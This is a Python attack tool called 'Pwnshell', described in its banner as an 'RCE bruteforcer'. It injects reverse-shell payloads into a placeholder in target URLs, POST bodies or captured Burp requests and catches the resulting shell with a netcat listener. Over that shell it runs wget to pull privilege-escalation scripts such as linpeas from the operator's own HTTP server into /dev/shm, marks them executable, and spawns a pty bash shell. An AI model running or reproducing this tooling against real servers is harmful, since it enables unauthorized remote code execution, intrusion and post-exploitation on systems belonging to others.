#!/usr/bin/env python3
# coding=utf-8
import argparse
import ipaddress
import json
import sys
import time
import urllib.parse
from http.server import HTTPServer, CGIHTTPRequestHandler
from os import system, chdir
from threading import Thread

import nclib
import requests
import urllib3
from rich.console import Console

from burpee import parse_request, get_method_and_resource
from payloads import CreatePayloads

console = Console()


class PwnShell:
    def __init__(self, args):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ip = args.host
        self.port = args.port
        self.domain = args.url
        self.method = args.method
        self.cookie = args.cookies
        self.headers = args.headers
        self.data = args.data
        if args.file:
            self.file = args.file
            self.method, resource = get_method_and_resource(self.file)
        if args.secure:
            self.secure = "https"
        else:
            self.secure = "http"
        self.url = None
        self.iteration = 0
        self.payload = None
        self.connected = False
        if not self.file and not self.domain:
            console.print(
                "[!] Please use Provide a URL or a REQUEST file[!]\n\n" + "[!] USAGE: " + sys.argv[0] + " -h\n",
                style="bold red")
            exit(1)

    def info(self):
        info = {'[*] LOCAL IP': self.ip, '[*] LOCAL PORT': self.port, '[*] TARGET URL ': self.domain,
                '[*] Method': self.method.upper(), '[*] Post Data': self.data, '[*] Request File': self.file}
        for key, value in info.items():
            if value:
                console.print(f"{key}: [white]{value}[/white]", style="yellow")
        print("\n")

    def send_payload(self):
        """Check the connection"""
        try:
            requests.get(self.domain)
        except requests.ConnectionError():
            console.print("[!] Connection Error, please check your network connection\n", style="bold red")
            exit(1)
        payloads = CreatePayloads(self.ip, self.port).Linux()
        console.print("[!] STAGE #1 --> [BRUTEFORCE] <--", style="bold yellow")
        for payload in payloads:
            if self.connected:
                break
            self.payload = self.get_url_encoded_payload(payload)
            self.iteration += 1
            console.print(f'[*] Trying payload [{self.iteration}/{len(payloads)}] : {payload[:30]}...', end='\r',
                          style="white")
            self.send_request()
        exit(1)

    def send_request(self):
        self.url = self.domain.replace('PWNME', self.payload)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1",
                   'Content-Type': 'application/x-www-form-urlencoded'}
        if self.headers:
            headers = json.loads(self.headers)
        if self.cookie:
            cookie = json.loads(self.cookie)
        else:
            cookie = None
        if self.method.lower() == 'post':
            if self.data:
                data_parsed = self.data.replace("PWNME", self.payload)
            else:
                data_parsed = None
            """Send a post request"""
            r = requests.post(self.url, headers=headers, cookies=cookie,
                              verify=False, data=data_parsed)
            time.sleep(2)
        else:
            """Send a get request"""
            r = requests.get(self.url, headers=headers, cookies=cookie,
                             verify=False)

    def listener(self):  # setting up the nc listener & stabling the shell then uploading linpeas to /dev/shm
        nc = nclib.Netcat(listen=('', self.port))
        console.print("\n\n[!] STAGE #2 --> [Post Pwn 💀] <--", style="bold yellow")
        self.connected = True  # To stop the thread
        self.for_listener()
        nc.send_line(b"export TERM=xterm-256color")
        console.print('[*] Uploading Shell Scripts To \[/dev/shm\]', style="bold yellow")
        send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
        nc.send_line(send.encode("utf-8"))
        send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm/ ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null ; clear'''
        nc.send_line(send.encode("utf-8"))
        print('[*] Activating a TTY Shell Using --> [Python3]')
        nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
        nc.interact()
        nc.close()

    def for_listener(self):
        """Printing only for get as post requests doesn't include parameters in the URI"""
        console.print(f"[+] Vulnerable URL: {self.url}", style="white")
        console.print(f"[+] Payload: [blue]{self.payload}[/blue]", style="white")
        self.log_to_file()
        console.print("\n[!] STAGE #3 --> [STABLING]", style="bold yellow")
        console.print('[*] Cloning PrivESC Scripts From Their Repositories...', style="white")
        system(
            'curl -f -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')

    def log_to_file(self):
        log_data = f'''
[+] Vulnerable URL: {self.url},
[+] Payload: {self.payload}
\n\n'''
        with open(f"logfile.txt", "a") as f:
            f.write(log_data)
            f.close()

    def parse_file(self):
        console.print("[!] STAGE #1 --> [BRUTEFORCE] <--", style="bold yellow")
        payloads = CreatePayloads(self.ip, self.port).Linux()
        request, post_data = parse_request(self.file)  # Get Headers
        method, resource = get_method_and_resource(self.file)  # Get method and URI
        url = f"{self.secure}://" + request["Host"] + resource
        for payload in payloads:
            time.sleep(2)
            if self.connected:
                break
            self.payload = self.get_url_encoded_payload(payload)
            self.iteration += 1
            req = request
            self.url = url.replace("PWNME", self.payload)
            console.print(f'[*] Trying payload [{self.iteration}/{len(payloads)}] : {payload[:30]}...', end='\r',
                          style="white")
            for r in req:
                if "PWNME" in req[r]:
                    req[r] = req[r].replace("PWNME", self.payload)

            if method.lower() == "post":
                if post_data:
                    post_data = post_data.replace("PWNME", self.payload)
                req = requests.post(self.url, headers=req, data=post_data, verify=False)
            elif method.lower() == "get":
                req = requests.get(self.url, headers=req, verify=False, proxies={"http": "http://127.0.0.1:8080"})
        exit(1)

    def is_valid(self):  # Checking if the ip address is valid
        try:
            ipaddress.ip_address(self.ip)
            if self.port <= 65535:
                return True
            else:
                console.print(f"[!] Invalid port number: {self.port}", style="bold red")
                exit(1)
        except ValueError:
            console.print(f"[!] Invalid ip: {self.ip}", style="bold red")
            exit(1)

    def http_server(self):
        # Make sure the server is created at current directory
        chdir('.')
        # Create server object listening the port 9002
        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
        # Start the web server
        server_object.serve_forever()

    def thread(self):
        listen = Thread(target=self.listener)
        httpserver = Thread(target=self.http_server)
        if self.file:
            burp = Thread(target=self.parse_file)
            burp.daemon = True
            burp.start()
        else:
            sendpayload = Thread(target=self.send_payload)
            sendpayload.daemon = True
            sendpayload.start()
        listen.daemon = True
        httpserver.daemon = True
        listen.start()
        httpserver.start()
        httpserver.join()
        listen.join()
        if self.file:
            burp.join()
        else:
            sendpayload.join()

    def main(self):
        self.info()
        self.is_valid()
        self.thread()

    @staticmethod
    def get_url_encoded_payload(payload):
        encoded_payload = urllib.parse.quote(payload)
        encoded_payload = encoded_payload.replace('/', '%2F')
        return encoded_payload


def get_banner():
    console.print("""
 ███████                              ██               ██  ██
░██░░░░██                            ░██              ░██ ░██
░██   ░██ ███     ██ ███████   ██████░██       █████  ░██ ░██
░███████ ░░██  █ ░██░░██░░░██ ██░░░░ ░██████  ██░░░██ ░██ ░██
░██░░░░   ░██ ███░██ ░██  ░██░░█████ ░██░░░██░███████ ░██ ░██
░██       ░████░████ ░██  ░██ ░░░░░██░██  ░██░██░░░░  ░██ ░██
░██       ███░ ░░░██ ███  ░██ ██████ ░██  ░██░░██████ ███ ███
░░       ░░░    ░░░ ░░░   ░░ ░░░░░░  ░░   ░░  ░░░░░░ ░░░ ░░░

[red]→[/red] [yellow]Pwnshell[/yellow] [red]|[/red] [yellow]RCE bruteforcer for business men[/yellow]
[white]-------------------------------------------------------------[/white]\n""", style="red")


if __name__ == '__main__':
    try:
        """Banner"""
        get_banner()
        """Option Parsers"""
        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        revshell = parser.add_argument_group("Reverse connection")
        revshell.add_argument('-i', '--host', help='LOCAL IP ADDRESS', required=True)
        revshell.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
        URL = parser.add_argument_group("URL Method")
        URL.add_argument("-u", "--url", help='Target url [http://localhost:8888/Vulnerable.php?meow=PWNME]')
        URL.add_argument("-d", "--data", help='Post data')
        URL.add_argument("-c", "--cookies", help='Enter Cookie')
        URL.add_argument("-H", "--headers", help='Provide custom header')
        URL.add_argument("-m", "--method", help='Request Method', default='POST')
        file_method = parser.add_argument_group("File Method")
        file_method.add_argument("-f", "--file", help='Request file')
        file_method.add_argument("-s", "--secure", help="Use https", default=False, action="store_true")
        args = parser.parse_args()
        pwnshell = PwnShell(args)
        pwnshell.main()
        pwnshell.send_payload()
    except KeyboardInterrupt:
        exit(1)
